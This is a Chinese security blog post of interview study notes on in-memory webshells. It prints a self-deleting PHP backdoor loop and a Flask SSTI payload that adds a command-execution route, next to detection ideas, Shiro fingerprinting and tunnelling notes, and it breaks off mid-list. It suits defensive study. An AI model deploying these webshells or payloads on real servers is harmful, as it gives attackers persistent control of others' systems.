@@ -1,0 +1,688 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 5.4.2">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+<link rel="stylesheet" href="//fonts.lug.ustc.edu.cn/css2?family=Lato:ital,wght@0,300;0,400;0,700;1,300;1,400;1,700&display=swap&subset=latin,latin-ext">
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css" integrity="sha256-dABdfBfUoC8vJUBOwGVdm8L9qlMWaHTIfXt+7GnZCIo=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancyapps-ui/5.0.31/fancybox/fancybox.css" integrity="sha256-gkQVf8UKZgQ0HyuxL/VnacadJ+D2Kox2TCEBuNQg5+w=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"liu1272.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":true,"version":"8.22.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":false,"copycode":{"enable":true,"style":"flat"},"fold":{"enable":true,"height":300},"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":50,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="https://cdn.jsdelivr.net/npm/hexo-theme-next@8.22.0/source/js/config.min.js"></script>
+
+    <meta name="description" content="分析一下内存马内存webshell原理  其原理是先由客户端发起一个web请求，中间件的各个独立的组件如Listener、Filter、Servlet等组件会在请求过程中做监听、判断、过滤等操作，内存马利用请求过程在内存中修改已有的组件或者动态注册一个新的组件，插入恶意的shellcode达到持久化的控制服务器。 PHP内存马原理">
+<meta property="og:type" content="article">
+<meta property="og:title" content="面试复习四">
+<meta property="og:url" content="https://liu1272.github.io/2024/03/25/%E9%9D%A2%E8%AF%95%E5%A4%8D%E4%B9%A0%E5%9B%9B/index.html">
+<meta property="og:site_name" content="Robin">
+<meta property="og:description" content="分析一下内存马内存webshell原理  其原理是先由客户端发起一个web请求，中间件的各个独立的组件如Listener、Filter、Servlet等组件会在请求过程中做监听、判断、过滤等操作，内存马利用请求过程在内存中修改已有的组件或者动态注册一个新的组件，插入恶意的shellcode达到持久化的控制服务器。 PHP内存马原理">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://s2.loli.net/2024/03/26/gDXkUQbqTjysWVp.png">
+<meta property="og:image" content="https://s2.loli.net/2024/03/25/UWL2R7pIsbrZYAM.webp">
+<meta property="og:image" content="https://s2.loli.net/2024/03/25/nKy2ecQ54PXYCZu.webp">
+<meta property="og:image" content="https://s2.loli.net/2024/03/25/ShWNvgHBD1GEdRl.webp">
+<meta property="article:published_time" content="2024-03-25T08:42:00.000Z">
+<meta property="article:modified_time" content="2024-03-25T17:09:40.000Z">
+<meta property="article:author" content="Shunyu">
+<meta property="article:tag" content="日报">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://s2.loli.net/2024/03/26/gDXkUQbqTjysWVp.png">
+
+
+<link rel="canonical" href="https://liu1272.github.io/2024/03/25/%E9%9D%A2%E8%AF%95%E5%A4%8D%E4%B9%A0%E5%9B%9B/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://liu1272.github.io/2024/03/25/%E9%9D%A2%E8%AF%95%E5%A4%8D%E4%B9%A0%E5%9B%9B/","path":"2024/03/25/面试复习四/","title":"面试复习四"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>面试复习四 | Robin</title>
+  
+
+  <script src="https://cdn.jsdelivr.net/npm/hexo-theme-next@8.22.0/source/js/third-party/analytics/baidu-analytics.min.js"></script>
+  <script async src="https://hm.baidu.com/hm.js?[object Object]"></script>
+
+  <script async src="//assets.growingio.com/2.1/gio.js"></script>
+  <script class="next-config" data-name="growingio_analytics" type="application/json">{"enable":false}</script>
+  <script src="https://cdn.jsdelivr.net/npm/hexo-theme-next@8.22.0/source/js/third-party/analytics/growingio.min.js"></script>
+
+  <script defer src='https://static.cloudflareinsights.com/beacon.min.js' data-cf-beacon='{&quot;token&quot;: &quot;[object Object]&quot;}'></script>
+
+  <script>
+    (function(c,l,a,r,i,t,y){
+        c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
+        t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
+        y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
+    })(window, document, "clarity", "script", "[object Object]");
+</script>
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+<link rel="alternate" href="/atom.xml" title="Robin" type="application/atom+xml">
+<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css">
+<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">Robin</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">LiuGuobin's blog</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">8</span></a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">111</span></a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+      <div class="search-header">
+        <span class="search-icon">
+          <i class="fa fa-search"></i>
+        </span>
+        <div class="search-input-container">
+          <input autocomplete="off" autocapitalize="off" maxlength="80"
+                placeholder="搜索..." spellcheck="false"
+                type="search" class="search-input">
+        </div>
+        <span class="popup-btn-close" role="button">
+          <i class="fa fa-times-circle"></i>
+        </span>
+      </div>
+      <div class="search-result-container">
+        <div class="search-result-icon">
+          <i class="fa fa-spinner fa-pulse fa-5x"></i>
+        </div>
+      </div>
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%86%E6%9E%90%E4%B8%80%E4%B8%8B%E5%86%85%E5%AD%98%E9%A9%AC"><span class="nav-number">1.</span> <span class="nav-text">分析一下内存马</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%86%85%E5%AD%98webshell%E5%8E%9F%E7%90%86"><span class="nav-number">1.0.1.</span> <span class="nav-text">内存webshell原理</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#PHP%E5%86%85%E5%AD%98%E9%A9%AC"><span class="nav-number">1.0.2.</span> <span class="nav-text">PHP内存马</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%8E%9F%E7%90%86"><span class="nav-number">1.0.2.1.</span> <span class="nav-text">原理</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%A3%80%E6%B5%8B%E6%80%9D%E8%B7%AF"><span class="nav-number">1.0.2.2.</span> <span class="nav-text">检测思路</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81"><span class="nav-number">1.0.2.3.</span> <span class="nav-text">代码</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Python%E5%86%85%E5%AD%98%E9%A9%AC"><span class="nav-number">1.0.3.</span> <span class="nav-text">Python内存马</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%8E%9F%E7%90%86-1"><span class="nav-number">1.0.3.1.</span> <span class="nav-text">原理</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%A3%80%E6%B5%8B%E6%80%9D%E8%B7%AF-1"><span class="nav-number">1.0.3.2.</span> <span class="nav-text">检测思路</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81-1"><span class="nav-number">1.0.3.3.</span> <span class="nav-text">代码</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Java%E5%86%85%E5%AD%98%E9%A9%AC"><span class="nav-number">1.0.4.</span> <span class="nav-text">Java内存马</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%8E%9F%E7%90%86-2"><span class="nav-number">1.0.4.1.</span> <span class="nav-text">原理</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#filter%E6%A3%80%E6%B5%8B%E6%80%9D%E8%B7%AF%EF%BC%9A"><span class="nav-number">1.0.4.2.</span> <span class="nav-text">filter检测思路：</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81-2"><span class="nav-number">1.0.4.3.</span> <span class="nav-text">代码</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%86%85%E5%AD%98%E9%A9%AC%E6%8E%92%E6%9F%A5%E6%80%9D%E8%B7%AF"><span class="nav-number">1.0.5.</span> <span class="nav-text">内存马排查思路</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%A6%82%E4%BD%95%E5%88%A4%E6%96%AD%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8Shiro%E6%BC%8F%E6%B4%9E"><span class="nav-number">2.</span> <span class="nav-text">如何判断是否存在Shiro漏洞</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%90%8E%E6%B8%97%E9%80%8F%E5%BB%BA%E7%AB%8B%E9%9A%A7%E9%81%93"><span class="nav-number">3.</span> <span class="nav-text">后渗透建立隧道</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B8%B8%E8%A7%84%E5%87%BA%E7%BD%91%E9%9A%A7%E9%81%93%E6%90%AD%E5%BB%BA"><span class="nav-number">3.1.</span> <span class="nav-text">常规出网隧道搭建</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E-%E6%9C%BA%E5%AD%90%E4%B8%8D%E5%87%BA%E7%BD%91%E6%83%85%E5%86%B5%E4%B8%8B%E6%80%8E%E4%B9%88%E5%8A%9E%EF%BC%9F"><span class="nav-number">3.2.</span> <span class="nav-text">漏洞&#x2F;机子不出网情况下怎么办？</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%AD%A3%E5%90%91Socks%E4%BB%A3%E7%90%86"><span class="nav-number">3.2.1.</span> <span class="nav-text">正向Socks代理</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8F%8D%E5%90%91%E7%AB%AF%E5%8F%A3%E6%98%A0%E5%B0%84"><span class="nav-number">3.2.2.</span> <span class="nav-text">反向端口映射</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8smb-beacon"><span class="nav-number">3.2.3.</span> <span class="nav-text">使用smb beacon</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E8%BF%9E%E6%8E%A5%E6%AD%A5%E9%AA%A4"><span class="nav-number">3.2.3.1.</span> <span class="nav-text">连接步骤</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8%E6%9D%A1%E4%BB%B6"><span class="nav-number">3.2.3.2.</span> <span class="nav-text">使用条件</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%85%8D%E7%BD%AElistener%E9%80%9A%E8%BF%87HTTP%E4%BB%A3%E7%90%86%E4%B8%8A%E7%BA%BF"><span class="nav-number">3.2.4.</span> <span class="nav-text">配置listener通过HTTP代理上线</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8pystinger%E6%90%AD%E5%BB%BAsocks4%E4%BB%A3%E7%90%86"><span class="nav-number">3.2.5.</span> <span class="nav-text">使用pystinger搭建socks4代理</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E8%BF%9E%E6%8E%A5%E6%AD%A5%E9%AA%A4-1"><span class="nav-number">3.2.5.1.</span> <span class="nav-text">连接步骤</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9F%9F%E5%86%85%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95"><span class="nav-number">4.</span> <span class="nav-text">域内攻击方法</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#MS14-068"><span class="nav-number">4.0.1.</span> <span class="nav-text">MS14-068</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Roasting-%E6%94%BB%E5%87%BB%E7%A6%BB%E7%BA%BF%E7%88%86%E7%A0%B4%E5%AF%86%E7%A0%81"><span class="nav-number">4.0.2.</span> <span class="nav-text">Roasting 攻击离线爆破密码</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB"><span class="nav-number">4.0.3.</span> <span class="nav-text">委派攻击</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#ntlm-relay"><span class="nav-number">4.0.4.</span> <span class="nav-text">ntlm relay</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Java%E5%86%85%E5%AD%98%E9%A9%AC%E4%BB%A3%E7%A0%81"><span class="nav-number">5.</span> <span class="nav-text">Java内存马代码</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%90%8E%E8%AE%B0"><span class="nav-number">6.</span> <span class="nav-text">后记</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Shunyu"
+      src="/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">Shunyu</p>
+  <div class="site-description" itemprop="description">Welcome</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">111</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">8</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">8</span>
+        <span class="site-state-item-name">标签</span>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/liu1272" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;liu1272" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:1265257855@qq.com" title="E-Mail → mailto:1265257855@qq.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+        </div>
+      </div>
+        <div class="back-to-top animated" role="button" aria-label="返回顶部">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://liu1272.github.io/2024/03/25/%E9%9D%A2%E8%AF%95%E5%A4%8D%E4%B9%A0%E5%9B%9B/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="Shunyu">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Robin">
+      <meta itemprop="description" content="Welcome">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="面试复习四 | Robin">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          面试复习四
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2024-03-25 16:42:00" itemprop="dateCreated datePublished" datetime="2024-03-25T16:42:00+08:00">2024-03-25</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2024-03-26 01:09:40" itemprop="dateModified" datetime="2024-03-26T01:09:40+08:00">2024-03-26</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E6%97%A5%E6%8A%A5/" itemprop="url" rel="index"><span itemprop="name">日报</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">阅读次数：</span>
+      <span id="busuanzi_value_page_pv"></span>
+    </span>
+    <span id="/2024/03/25/%E9%9D%A2%E8%AF%95%E5%A4%8D%E4%B9%A0%E5%9B%9B/" class="post-meta-item leancloud_visitors" data-flag-title="面试复习四" title="阅读次数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">阅读次数：</span>
+      <span class="leancloud-visitors-count"></span>
+    </span>
+  
+    <span class="post-meta-break"></span>
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>3.3k</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>12 分钟</span>
+    </span>
+</div>
+
+
+          # 置顶图标
+          
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h2 id="分析一下内存马"><a href="#分析一下内存马" class="headerlink" title="分析一下内存马"></a>分析一下内存马</h2><h4 id="内存webshell原理"><a href="#内存webshell原理" class="headerlink" title="内存webshell原理"></a>内存webshell原理</h4><p>  其原理是先由客户端发起一个web请求，中间件的各个独立的组件如Listener、Filter、Servlet等组件会在请求过程中做监听、判断、过滤等操作，内存马利用请求过程在内存中修改已有的组件或者动态注册一个新的组件，插入恶意的shellcode达到持久化的控制服务器。<br><a href="https://smms.app/image/gDXkUQbqTjysWVp" target="_blank"><img src="https://s2.loli.net/2024/03/26/gDXkUQbqTjysWVp.png" ></a></p>
+<h4 id="PHP内存马"><a href="#PHP内存马" class="headerlink" title="PHP内存马"></a>PHP内存马</h4><h5 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h5><p>  php内存马也就是php不死马是将不死马启动后删除本身，在内存中执行死循环，使管理员无法删除木马文件。<br>  对于不死马，直接删除脚本是没有用的，因为php执行的时候已经把脚本读进去解释成opcode运行了，会使用条件竞争写入同名文件进行克制不死马。</p>
+<h5 id="检测思路"><a href="#检测思路" class="headerlink" title="检测思路"></a>检测思路</h5><p>  1. 检查所有php进程处理请求的持续时间<br>  2. 检测执行文件是否在文件系统真实存在</p>
+<h5 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h5><pre class="line-numbers language-PHP"><code class="language-PHP">
+<?php
+set_time_limit(0);
+ignore_user_abort(1);
+unlink(__FILE__);
+while (1) &#123;
+    $content = ‘<?php @eval($_POST["zzz"]) ?>’;
+    file_put_contents("22.php", $content);
+    usleep(10000);
+&#125;
+?>
+
+函数说明：
+    ignore_user_abort()函数：函数设置与客户机断开是否会终止脚本的执行，如果设置为 true，则忽略与用户的断开。
+    set_time_limit()函数：设置允许脚本运行的时间，单位为秒。如果设置为0（零），没有时间方面的限制。
+    unlink(__FILE__)函数：删除文件。
+    file_put_contents函数：将一个字符串写入文件。
+    usleep函数：延迟执行当前脚本若干微秒（一微秒等于一百万分之一秒）。
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h4 id="Python内存马"><a href="#Python内存马" class="headerlink" title="Python内存马"></a>Python内存马</h4><h5 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h5><p>  Python内存马利用flask框架中ssti注入来实现，flask框架中在web应用模板渲染的过程中用到render_template_string()进行渲染，但未对用户传输的代码进行过滤导致用户可以通过注入恶意代码来实现python内存马的注入。</p>
+<h5 id="检测思路-1"><a href="#检测思路-1" class="headerlink" title="检测思路"></a>检测思路</h5><p>  1. 查看所有内建模块中是否包含eval、exec等可以执行代码的函数如：<code>class ‘warnings.catch_warnings’</code>、<code>class &#39;site.Quitter&#39;</code>等。<br>  2. 检测<code>self.add_url_rule()</code>中特殊名字的路由如shell等。</p>
+<h5 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h5><pre><code>http://127.0.0.1:5000/index?=content&#123;&#123;a.__init__.__globals__[%27__builtins__%27][%27eval%27](%22app.add_url_rule(%27/shell1%27,%20%27shell%27,%20lambda%20:__import__(%27os%27).popen(_request_ctx_stack.top.request.args.get(%27cmd%27,%20%27whoami%27)).read())%22,&#123;%27_request_ctx_stack%27:url_for.__globals__[%27_request_ctx_stack%27],%27app%27:url_for.__globals__[%27current_app%27]&#125;)&#125;&#125;
+
+需要URL编码
+
+http://127.0.0.1:5000/index?=content&#123;&#123;a.__init__.__globals__['__builtins__']['eval']("app.add_url_rule('/shell1', 'shell', lambda :__import__('os').popen(_request_ctx_stack.top.request.args.get('cmd', 'whoami')).read())",&#123;'_request_ctx_stack':url_for.__globals__['_request_ctx_stack'],'app':url_for.__globals__['current_app']&#125;)&#125;&#125;
+
+函数说明：
+    __class__：返回调用的参数类型
+    __bases__：返回基类列表
+    __builtins__：内建模块的引用，在任何地方都是可见的(包括全局)，每个 Python 脚本都会自动加载，这个模块包括了很多强大的 built-in 函数，例如eval, exec, open等
+    __globals__：以字典的形式返回函数所在的全局命名空间所定义的全局变量,这里的函数可以是类class的构造函数如__init__,也可以是flask的函数如url_for等。
+    add_url_rule注册了一个/shell的路由，__init__相当于构造函数，定义自己的属性，通过__init__.__globals__得到他们的命名空间从而得到builtins就可以执行内置函数如eval, exec, open等。
+</code></pre>
+<h4 id="Java内存马"><a href="#Java内存马" class="headerlink" title="Java内存马"></a>Java内存马</h4><h5 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h5><p>  FIlter为过滤器可以对用户的一些请求进行拦截修改等操作。<br>  当web.xml中注册了一个Filter来对某个 Servlet 程序进行拦截处理时，该 Filter 可以对Servlet 容器发送给 Servlet 程序的请求和 Servlet 程序回送给 Servlet 容器的响应进行拦截，可以决定是否将请求继续传递给 Servlet 程序，以及对请求和相应信息进行修改。<br>  filter型内存马是将命令执行的文件通过动态注册成一个恶意的filter，这个filter没有落地文件并可以让客户端发来的请求通过它来做命令执行。</p>
+<h5 id="filter检测思路："><a href="#filter检测思路：" class="headerlink" title="filter检测思路："></a>filter检测思路：</h5><p>  1. 带有特殊含义的filter的名字比如shell等<br>  2. Filter的优先级，filter内存马需要将filter调至最高<br>  3. 查看web.xml中有没有filter配置<br>  4. 检测特殊的classloader<br>  5. 检测classloader路径下没有class文件<br>  6. 检测Filter中的doFilter方法是否有恶意代码</p>
+<h5 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h5><p>  代码非常长，放在文章最后面了。</p>
+<h4 id="内存马排查思路"><a href="#内存马排查思路" class="headerlink" title="内存马排查思路"></a>内存马排查思路</h4><p>  - 先判断是通过什么方法注入的内存马，可以先查看web日志是否有可疑的web访问日志，如果是filter或者listener类型就会有大量url请求路径相同参数不同的，或者页面不存在但是返回200的<br>  - 查看是否有类似哥斯拉、冰蝎相同的url请求，哥斯拉和冰蝎的内存马注入流量特征与普通webshell的流量特征基本吻合。<br>  - 查找返回200的url路径对比web目录下是否真实存在文件，如不存在大概率为内存马。<br>  - 如在web日志中并未发现异常，可以排查是否为中间件漏洞导致代码执行注入内存马，排查中间件的error.log日志查看是否有可疑的报错，根据注入时间和方法根据业务使用的组件排查是否可能存在java代码执行漏洞以及是否存在过webshell，排查框架漏洞，反序列化漏洞。</p>
+<h2 id="如何判断是否存在Shiro漏洞"><a href="#如何判断是否存在Shiro漏洞" class="headerlink" title="如何判断是否存在Shiro漏洞"></a>如何判断是否存在Shiro漏洞</h2><p>  <strong>未登陆的情况下</strong>，请求包的 cookie 中没有 <code>rememberMe</code> 字段，返回包 set-Cookie 里也没有 <code>deleteMe</code> 字段<br>  <strong>登陆失败</strong>的话 ， 不管勾选 RememberMe 字段没有 ， 返回包都会有<code>rememberMe=deleteMe</code> 字段<br>  不勾选 RememberMe 字段 ， 登陆成功的话 ， 返回包 set-Cookie 会有<code>rememberMe=deleteMe</code> 字段。但是之后的所有请求中 Cookie 都不会有 rememberMe字段<br>  勾选 RememberMe 字 段 ， 登陆成功的话 ， 返回包 set-Cookie 会有<code>rememberMe=deleteMe</code> 字段，还会有 rememberMe 字段，之后的所有请求中 Cookie都会有 rememberMe 字段</p>
+<h2 id="后渗透建立隧道"><a href="#后渗透建立隧道" class="headerlink" title="后渗透建立隧道"></a>后渗透建立隧道</h2><h3 id="常规出网隧道搭建"><a href="#常规出网隧道搭建" class="headerlink" title="常规出网隧道搭建"></a>常规出网隧道搭建</h3><p>  <strong>使用frp/ligolo等基于golang的内网穿透工具。</strong></p>
+<ol>
+<li>使用MSF获取Session后建立端口转发/socks4a/socks5代理。</li>
+<li>使用regeorg/Tunna/ABPTTS等基于webshell的内网代理。<br>  其中基于frp/ligolo等内网穿透工具是出网环境最好的选择，因为此类工具中都集成TLS加密/TCP连接复用/socks5代理功能，有极高的传输效率及稳定性。</li>
+</ol>
+<h3 id="漏洞-机子不出网情况下怎么办？"><a href="#漏洞-机子不出网情况下怎么办？" class="headerlink" title="漏洞/机子不出网情况下怎么办？"></a>漏洞/机子不出网情况下怎么办？</h3><h4 id="正向Socks代理"><a href="#正向Socks代理" class="headerlink" title="正向Socks代理"></a>正向Socks代理</h4><ul>
+<li>client运行在互联网的vps上，开启端口监听处理proxychains转发的tcp连接。</li>
+<li>clinet从tcp连接中读取数据，将数据存储在post请求中发送到webshell。</li>
+<li>webshell将http请求转发到本地的server服务器。</li>
+<li>server为运行在不出网主机中，取出http请求中的数据，根据socks协议规则解析目的地址及端口。</li>
